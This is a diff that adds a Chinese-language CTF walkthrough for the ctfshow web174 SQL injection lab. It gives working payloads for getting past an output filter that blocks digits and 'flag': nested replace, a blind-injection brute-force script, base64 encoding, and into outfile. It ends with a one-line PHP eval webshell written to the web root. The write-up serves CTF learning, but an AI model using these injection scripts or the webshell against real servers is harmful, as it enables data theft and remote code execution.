@@ -758,3 +758,257 @@ username 列的 f + password 开头的 lag = flag（确认这就是 flag 用户�
 ![image-20261128122425558](/assets/ctfshow-web-sqli/image-20261128122425558.png)
 
 `reverse('flag')` = `'galf'`，四个字母倒着输出。JSON 里只有 galf，正则在整段文本里找不到连续的 f-l-a-g → 放行；拿到 `galf` 倒着读就是 flag，信息没丢。
+
+### web174
+
+还是进入到`select-no-waf-4.php`界面里
+
+![image-20261128180954247](/assets/ctfshow-web-sqli/image-20261128180954247.png)
+
+#### php代码逻辑
+
+```
+//检查结果是否有flag
+if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
+  $ret['msg']='查询成功';
+}
+```
+
+对比 web173 的 `/flag/i`，正则多了一段：竖线 `|` 表示“或”，也就是**整个返回 JSON 里既不能出现 flag 字样，也不能出现任何数字 0-9**（不分大小写）。
+
+查询语句一样：
+
+```php
+$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
+```
+
+#### 探测
+
+```
+1' order by 2--+              -> 正常
+1' order by 3--+              -> 报错      => 2 列
+-1' union select 'a','b'--+  -> {"username":"a","password":"b"}   纯字母能过
+-1' union select 'a','b1'--+ -> 查询失败，data 空 —— 输出里有一个数字就被拦
+```
+
+![image-20261128181209725](/assets/ctfshow-web-sqli/image-20261128181209725.png)
+
+![image-20261128181226355](/assets/ctfshow-web-sqli/image-20261128181226355.png)
+
+![image-20261128181258922](/assets/ctfshow-web-sqli/image-20261128181258922.png)
+
+![image-20261128181321446](/assets/ctfshow-web-sqli/image-20261128181321446.png)
+
+问题出在这里：flag 本身是 `ctfshow{uuid}`，uuid 里全是数字。173 方法（hex、replace 换一个字母、substr、reverse）不起作用了，hex 的输出是 0-9a-f，本身就带数字；base64 也带数字。
+
+#### 法1：嵌套 replace，把数字换成大写字母
+
+思路：换一种文本表示，让黑名单匹配不到，同时自己能还原。这次要把 0-9 十个数字全部换掉。
+
+映射选**大写字母** A-J ：返回的 `ctfshow{uuid}` 全是小写，大写字母不会和原有内容混淆，逆运算一眼可辨。
+
+```
+0→A  1→B  2→C  3→D  4→E  5→F  6→G  7→H  8→I  9→J
+```
+
+十层 replace 手写容易套错，用 python 脚本一步跑完（生成 → 发请求 → 解码），可以在桌面建一个py然后在终端进行调用：
+
+```python
+import requests
+from urllib.parse import quote
+
+url = 'http://【靶场地址】/api/v4.php'
+
+# 1. 生成十层嵌套 replace：数字 -> 大写字母
+t = 'password'
+for d, l in zip('0123456789', 'ABCDEFGHIJ'):
+    t = f"replace({t},'{d}','{l}')"
+
+# 2. 拼 payload 发请求（safe='+' 让 --+ 的加号保持原样）
+payload = f"-1' union select 'a',{t} from ctfshow_user4 where username='flag'--+"
+r = requests.get(url + '?id=' + quote(payload, safe='+'), verify=False)
+
+# 3. 取回编码结果，把大写字母逆映射回数字（A→0 …… J→9）
+enc = r.json()['data'][0]['password']
+flag = ''.join(str('ABCDEFGHIJ'.index(c)) if c.isupper() else c for c in enc)
+print(flag)
+```
+
+![image-20261128185034597](/assets/ctfshow-web-sqli/image-20261128185034597.png)
+
+`verify=False` 是本机证书链缺颁发者、requests 报 SSL 证书错误时才需要加的；换台机器报错消失就去掉。
+
+或者使用sql注入方式，payload：
+
+```sql
+-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','A'),'1','B'),'2','C'),'3','D'),'4','E'),'5','F'),'6','G'),'7','H'),'8','I'),'9','J') from ctfshow_user4 where username='flag'--+
+```
+
+十层嵌套从里往外看：最里层先把 `0` 换成 `A`，然后逐层把 `1` 换成 `B`……最后把 `9` 换成 `J`。数字换完就变成字母，不会再产生新的数字，所以不存在替换串扰。
+
+![image-20261128185136198](/assets/ctfshow-web-sqli/image-20261128185136198.png)
+
+返回：
+
+```json
+{"username":"a","password":"ctfshow{GDadcDHe-CCJa-EEcI-JIJG-HJFGdbfEHaee}"}
+```
+
+本地做逆运算，大写字母换回数字（A→0、B→1……J→9）：
+
+```python
+# 本地逆运算：把加密结果里的大写字母换回数字
+# enc 换成你实际拿到的编码结果
+enc = 'ctfshow{GDadcDHe-CCJa-EEcI-JIJG-HJFGdbfEHaee}'
+
+# 加密时用的映射是 数字 -> 大写字母（0→A … 9→J），逆运算就是反着查
+mapping = {
+    'A': '0', 'B': '1', 'C': '2', 'D': '3', 'E': '4',
+    'F': '5', 'G': '6', 'H': '7', 'I': '8', 'J': '9',
+}
+
+flag = ''
+for c in enc:
+    if c in mapping:      # 是我们替换出来的大写字母 → 换回对应的数字
+        flag += mapping[c]
+    else:                 # 小写字母、-、{、} 这些原样保留
+        flag += c
+
+print(flag)
+```
+
+#### 一个编码坑
+
+用 python 的 `urllib.parse.quote()` 给 payload 做 URL 编码时，默认会把 `+` 编码成 `%2B`。这样 `--+` 到了服务器就变成字面加号，注释失效，接口直接空响应。要写成 `quote(payload, safe="+")`，让 `+` 保持原样，PHP 才会把它解码成空格。手写 URL 或在浏览器输入框里打就没问题。
+
+同一个 payload `1' and 1=1--+`，只改加号的发送方式：
+
+| 发送方式 | 服务器收到 | 结果 |
+|---|---|---|
+| `--%2B`（quote 默认） | 字面加号，注释失效 | 空响应（语法错误） |
+| `--+`（原样发送） | `-- ` 合法注释 | admin 正常返回 |
+
+原理：URL 里的加号有两个身份——PHP 解析 GET 参数时按老约定把 `+` 当**空格**；但 python 的 `quote()` 默认把 `+` 当特殊字符编码成 `%2B`，服务器解码回来就还原成了字面加号。而 MySQL 要求 `--` 后面必须跟空白符才算注释（Q3 讲过），字面加号凑不上，后面那段 `' limit 1;` 就留下来把语法弄坏了。
+
+#### 法2：布尔盲注，一个字符一个字符猜
+
+replace 拿不到的场景还有个万能——盲注。利用的是探测阶段已经确认的事实：**条件为真时返回 admin，条件为假时返回空**。
+
+```sql
+1' and 1=1--+    -> 返回 admin（真）
+1' and 1=2--+    -> 返回空（假）
+```
+
+把 `1=1` 换成对 flag 每个字符的判断：
+
+```sql
+1' and ascii(substr((select password from ctfshow_user4 where username='flag'),1,1))>100--+
+```
+
+三个函数分工：`substr(...,i,1)` 取第 i 个字符，`ascii()` 转成数字，外面比较大小。对每个位置用二分法（先问 >64？再问 >96？……），7 次左右就能锁定一个字符。
+
+拆开看这条 payload 的三层：
+
+- **最内层** `(select password ... where username='flag')`：子查询，先把 flag 的密码单独查出来当原料
+- **`substr(原料, i, 1)`**：从第 i 位取 1 个字符 → 一次只拿一个字符
+- **`ascii(字符) > 数字`**：字符变数字后才能比大小
+
+真假信号来自最外层的 `1' and (比较结果)`：比较为真 → `and` 保住 id='1' 那行 → 返回 admin；为假 → 整个 WHERE 为假 → 空响应。
+
+实际问答记录（在靶场上猜第一个字符的完整过程）：
+
+| 问题（发给服务器） | 响应 | 得知范围 |
+|---|---|---|
+| ascii > 79？ | admin（真） | 80~126 |
+| ascii > 103？ | 空（假） | 80~103 |
+| ascii > 91？ | admin（真） | 92~103 |
+| ascii > 97？ | admin（真） | 98~103 |
+| ascii > 100？ | 空（假） | 98~100 |
+| ascii > 99？ | 空（假） | **锁定 99 → chr(99) = 'c'** |
+
+6 次请求锁定一个字符。95 个候选字符用二分最多 7 问（2⁷ = 128 > 95），逐个问“=97？=98？”最坏得问 95 次。
+
+完整脚本：
+
+```python
+import requests
+
+url = 'http://【靶场地址】/api/v4.php'
+flag = ''
+
+for i in range(1, 60):
+    low, high = 32, 126
+    while low < high:
+        mid = (low + high) // 2
+        payload = f"?id=1' and ascii(substr((select password from ctfshow_user4 where username='flag'),{i},1))>{mid}--+"
+        r = requests.get(url + payload)
+        if 'admin' in r.text:      # 条件为真，字符比 mid 大
+            low = mid + 1
+        else:                      # 条件为假
+            high = mid
+    if low <= 32 or low >= 127:
+        break                      # 取不到字符了，结束
+    flag += chr(low)
+    print(flag)
+```
+
+几百个请求换一个 flag，比 replace 慢，但它只依赖“能区分真假”，任何有回显差异的注入点都能用。
+
+#### 法3：to_base64 + replace
+
+目的：找一个“输出里没有数字”的编码形式。hex 不行（0-9a-f 自带数字），base64 也一样——拿本题 flag 实测：
+
+```
+原 flag: ctfshow{uuid}
+to_base64 → Y3Rmc2hvd3swMTg5OGY2Zi0xYWM4LTRjZGItODNjMC03NDk2ODM3MjExOTZ9
+里面有数字吗？有（2、3、4、0、9、8、6、5……）→ 直接回显必被拦
+```
+
+所以再加一层 replace，把每个数字换成 `^A`~`^J`（`^` 是前缀记号，A~J 对应 0~9）：
+
+```sql
+-1' union select 'a',replace(to_base64(password),'0','^A')--+
+```
+
+```
+-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'0','^A'),'1','^B'),'2','^C'),'3','^D'),'4','^E'),'5','^F'),'6','^G'),'7','^H'),'8','^I'),'9','^J') from ctfshow_user4 where username='flag'--+
+```
+
+![image-20261128193205127](/assets/ctfshow-web-sqli/image-20261128193205127.png)
+
+十层 replace 套在 to_base64 外面：
+
+```json
+{"username":"a","password":"Y^DRmc^Chvd^DswMTg^FOGY^CZi^AxYWM^ELTRjZGItODNjMC^A^DNDk^CODM^DMjExOTZ^J"}
+```
+
+整个字符串里没有数字 → 放行。
+
+本地逆运算两步：
+
+1. `^A`→0、`^B`→1……`^J`→9，还原出 base64 原文：`Y3Rmc2hvd3swMTg5OGY2Zi0xYWM4LTRjZGItODNjMC03NDk2ODM3MjExOTZ9`
+2. base64 解码 → 得到 flag
+
+![image-20261128193329824](/assets/ctfshow-web-sqli/image-20261128193329824.png)
+
+为什么要带 `^` 前缀：base64 的字母表里本来就有大写字母 A~J，如果直接把 `0` 换成 `A`，替换后的 A 分不清哪些是标记、哪些是原文。`^` 不在 base64 字母表里，标记和原文不会混（用 `_a_` 下划线也是同一个道理）。
+
+#### 法4：into outfile，把结果写到靶机上
+
+MySQL 账号有 FILE 权限（靶机默认放开了）时，可以让查询结果直接落盘：
+
+```sql
+1' union select username,password from ctfshow_user4 into outfile '/var/www/html/flag.txt'--+
+```
+
+查询结果写进了文件、不会进入 PHP 的检查逻辑，所以数字和 flag 原样保存。直接访问 `http://靶场地址/flag.txt` 就能看到全表。
+
+![image-20261128192853591](/assets/ctfshow-web-sqli/image-20261128192853591.png)
+
+还能更进一步写个 webshell：
+
+```sql
+1' union select 1,"<?php @eval($_POST[1]);?>" into outfile '/var/www/html/shell.php'--+
+```
+
+用蚁剑连上后，甚至可以打开 `api/v4-waf.php`，把里面的过滤规则删掉，变回无过滤注入。
